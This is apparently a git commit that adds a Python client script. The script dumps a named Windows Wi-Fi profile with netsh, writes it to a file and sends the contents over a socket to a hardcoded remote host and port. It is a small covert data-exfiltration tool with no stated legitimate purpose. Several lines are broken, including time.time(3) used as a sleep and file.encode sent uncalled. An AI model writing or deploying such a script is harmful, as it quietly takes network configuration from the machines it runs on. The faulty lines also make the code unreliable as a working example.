c91458218726f2a91de8c17e6e169e2929b3aa7c
baroukh404 <rrabeandriamarozoky@gmail.com>
2022-06-06 21:08:12 +0300

    Build client.py to connect on server

---
+++ client.py
@@ -0,0 +1,23 @@
+import time
+import socket
+import os
+
+os.system("netsh wlan show profiles Smartone_Direction > wifi_information.txt")
+with open("wifi_information.txt", "r") as file:
+    file = file.read()
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+while True:
+    try:
+        #the client try to connect 
+        client.connect(("10.200.45.55", 8000))
+    except:
+        print("code exited ...")
+        time.time(3)
+    else:
+        client.send(file.encode)
+        print("get information finished")
+        break
+exit()
+
